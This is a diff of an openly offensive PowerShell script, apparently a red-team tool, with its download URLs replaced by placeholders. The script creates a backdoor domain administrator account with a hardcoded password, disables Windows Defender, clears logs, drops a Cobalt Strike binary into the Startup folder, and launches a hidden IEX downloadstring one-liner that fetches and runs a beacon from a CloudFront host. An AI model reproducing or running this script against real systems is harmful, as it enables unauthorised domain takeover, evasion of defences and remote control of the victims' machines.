@@ -1,4 +1,5 @@
-﻿$Username = "SQL_Admin"
+# Create new domain user and add to domain groups Administrators, Remote Desktop, Domain Admins, Enterprise Admins.
+$Username = "SQL_Admin"
 $Password = 'SQLAdmin@123'
 
 $group = "Administrators"
@@ -66,7 +67,7 @@ if (!$error) { "[+] Disabled Windows Defender!" }
 # download of Cobalt Strike Binary
 $error.clear()
 try {
-    Invoke-WebRequest -Uri "https://businessefficient.net/docs/help.pdf" -OutFile "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\hh.exe"
+    Invoke-WebRequest -Uri "[url]" -OutFile "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\hh.exe"
     }
 catch { "[-] File Download Failed" }
 if (!$error) { "[+] File Download Successful" }
@@ -117,7 +118,7 @@ if (!$error) { "[+] Successfully Cleared Logs!" }
 
 # CS One Liner for fast connection
 try {
-    Start-Process -FilePath "powershell" -ArgumentList "-nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('https://d2qzt5p43mtyrn.cloudfront.net:443/prccdc'))"
+    Start-Process -FilePath "powershell" -ArgumentList "-nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('https://subdomain.cloudfront.net:443/prccdc'))"
 }
 catch {
     "[-] Failed to run beacon 1 liner"
